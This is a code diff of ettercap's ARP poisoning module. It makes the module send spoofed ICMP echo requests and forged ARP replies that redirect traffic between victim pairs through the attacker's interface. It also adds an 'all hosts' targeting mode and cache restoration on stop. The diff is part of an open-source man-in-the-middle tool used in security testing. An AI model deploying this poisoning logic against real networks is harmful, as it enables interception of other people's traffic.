@@ -17,13 +17,15 @@
     along with this program; if not, write to the Free Software
     Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 
-    $Header: /home/drizzt/dev/sources/ettercap.cvs/ettercap_ng/src/mitm/ec_arp_poisoning.c,v 1.2 2003/08/20 16:00:54 alor Exp $
+    $Header: /home/drizzt/dev/sources/ettercap.cvs/ettercap_ng/src/mitm/ec_arp_poisoning.c,v 1.3 2003/08/21 14:36:02 alor Exp $
 */
 
 #include <ec.h>
 #include <ec_mitm.h>
 #include <ec_send.h>
 #include <ec_threads.h>
+
+#include <libnet.h>
 
 /* globals */
 
@@ -72,9 +74,8 @@ EC_THREAD_FUNC(poisoner)
 {
    int i = 1;
    struct hosts_list *g1, *g2;
-   char tmp[MAX_ASCII_ADDR_LEN];
-   char tmp2[MAX_ASCII_ADDR_LEN];
-
+  
+   /* never ending loop */
    LOOP {
       
       CANCELLATION_POINT();
@@ -87,17 +88,19 @@ EC_THREAD_FUNC(poisoner)
             if (!ip_addr_cmp(&g1->ip, &g2->ip))
                continue;
             
-            USER_MSG(" POISON : TO %-15s -- %-15s is at ", 
-               ip_addr_ntoa(&g1->ip, tmp), 
-               ip_addr_ntoa(&g2->ip, tmp2)); 
-            USER_MSG(" %17s \n", 
-               mac_addr_ntoa(GBL_IFACE->mac, tmp2));
+            /* 
+             * send the spoofed ICMP echo request 
+             * to force the arp entry in the cache
+             */
+            if (i == 1) {
+               send_icmp_echo(ICMP_ECHO, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac);
+               send_icmp_echo(ICMP_ECHO, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac);
+            }
             
-            USER_MSG(" POISON : TO %-15s -- %-15s is at ", 
-               ip_addr_ntoa(&g2->ip, tmp), 
-               ip_addr_ntoa(&g1->ip, tmp2)); 
-            USER_MSG(" %17s \n", 
-               mac_addr_ntoa(GBL_IFACE->mac, tmp2));
+            /* the effective poisoning packets */
+            send_arp(ARPOP_REPLY, &g2->ip, GBL_IFACE->mac, &g1->ip, g1->mac); 
+            send_arp(ARPOP_REPLY, &g1->ip, GBL_IFACE->mac, &g2->ip, g2->mac); 
+           
          }
       }
       
@@ -126,8 +129,6 @@ static void arp_poisoning_start(void)
    
    DEBUG_MSG("arp_poisoning_start");
 
-NOT_IMPLEMENTED();
-   
    /* create the list used later to poison the targets */
    if (GBL_OPTIONS->silent && !GBL_OPTIONS->load_hosts)
       ret = create_silent_list();
@@ -152,8 +153,6 @@ static void arp_poisoning_stop(void)
    int i;
    struct hosts_list *h;
    struct hosts_list *g1, *g2;
-   char tmp[MAX_ASCII_ADDR_LEN];
-   char tmp2[MAX_ASCII_ADDR_LEN];
    
    DEBUG_MSG("arp_poisoning_stop");
    
@@ -175,17 +174,10 @@ static void arp_poisoning_stop(void)
             if (!ip_addr_cmp(&g1->ip, &g2->ip))
                continue;
             
-            USER_MSG(" REARP : TO %-15s -- %-15s is at ", 
-               ip_addr_ntoa(&g1->ip, tmp), 
-               ip_addr_ntoa(&g2->ip, tmp2)); 
-            USER_MSG(" %17s \n", 
-               mac_addr_ntoa(g2->mac, tmp2));
+            /* the effective poisoning packets */
+            send_arp(ARPOP_REPLY, &g2->ip, g2->mac, &g1->ip, g1->mac); 
+            send_arp(ARPOP_REPLY, &g1->ip, g1->mac, &g2->ip, g2->mac); 
             
-            USER_MSG(" REARP : TO %-15s -- %-15s is at ", 
-               ip_addr_ntoa(&g2->ip, tmp), 
-               ip_addr_ntoa(&g1->ip, tmp2)); 
-            USER_MSG(" %17s \n", 
-               mac_addr_ntoa(g1->mac, tmp2));
          }
       }
       
@@ -321,7 +313,7 @@ static int create_list(void)
    
    USER_MSG("\nARP poisoning victims:\n\n");
   
-   /* the first group */
+/* the first group */
    SLIST_FOREACH(i, &GBL_TARGET1->ips, next) {
       LIST_FOREACH(h, &GBL_HOSTLIST, next) {
          if (!ip_addr_cmp(&i->ip, &h->ip)) {
@@ -338,10 +330,31 @@ static int create_list(void)
          }
       }
    }
+   
+   /* the target is NULL. convert to ANY (all the hosts) */
+   if (SLIST_FIRST(&GBL_TARGET1->ips) == NULL) {
+
+      USER_MSG(" GROUP 1 : ANY (all the hosts in the list)\n");
+      
+      /* add them */ 
+      LIST_FOREACH(h, &GBL_HOSTLIST, next) {
+           
+         /* create the element and insert it in the list */
+         g = calloc(1, sizeof(struct hosts_list));
+         ON_ERROR(g, NULL, "can't allocate memory");
+
+         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
+         memcpy(&g->mac, &h->mac, ETH_ADDR_LEN);
+           
+         LIST_INSERT_HEAD(&group_one_head, g, next);
+      }
+   }
 
    USER_MSG("\n");
    
-   /* the second group */
+/* the second group */
+
+   /* if the target was specified */
    SLIST_FOREACH(i, &GBL_TARGET2->ips, next) {
       LIST_FOREACH(h, &GBL_HOSTLIST, next) {
          if (!ip_addr_cmp(&i->ip, &h->ip)) {
@@ -356,6 +369,25 @@ static int create_list(void)
             
             LIST_INSERT_HEAD(&group_two_head, g, next);
          }
+      }
+   }
+   
+   /* the target is NULL. convert to ANY (all the hosts) */
+   if (SLIST_FIRST(&GBL_TARGET2->ips) == NULL) {
+
+      USER_MSG(" GROUP 2 : ANY (all the hosts in the list)\n");
+      
+      /* add them */ 
+      LIST_FOREACH(h, &GBL_HOSTLIST, next) {
+           
+         /* create the element and insert it in the list */
+         g = calloc(1, sizeof(struct hosts_list));
+         ON_ERROR(g, NULL, "can't allocate memory");
+
+         memcpy(&g->ip, &h->ip, sizeof(struct ip_addr));
+         memcpy(&g->mac, &h->mac, ETH_ADDR_LEN);
+           
+         LIST_INSERT_HEAD(&group_two_head, g, next);
       }
    }
    
